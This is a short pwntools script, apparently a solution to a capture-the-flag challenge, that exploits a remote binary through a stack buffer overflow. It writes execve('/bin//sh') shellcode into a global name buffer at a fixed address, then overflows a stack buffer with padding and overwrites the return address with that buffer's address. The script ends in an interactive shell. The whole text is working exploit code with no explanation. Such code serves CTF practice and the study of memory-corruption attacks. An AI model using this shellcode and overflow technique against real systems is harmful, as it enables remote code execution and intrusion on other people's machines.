from pwn import*
e = ELF("./prob1")
r = remote("ctf.j0n9hyun.xyz",3003)

context.log_level = 'debug'
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"

name_add = 0x0804A060                                                               
log.info(r.recv())

payload = shellcode                                                                 
r.sendline(payload) 

log.info(r.recv())

payload = "" 
payload += "A"*0x14 + "A"*0x4
payload += p32(name_add)

r.sendline(payload)
r.interactive()
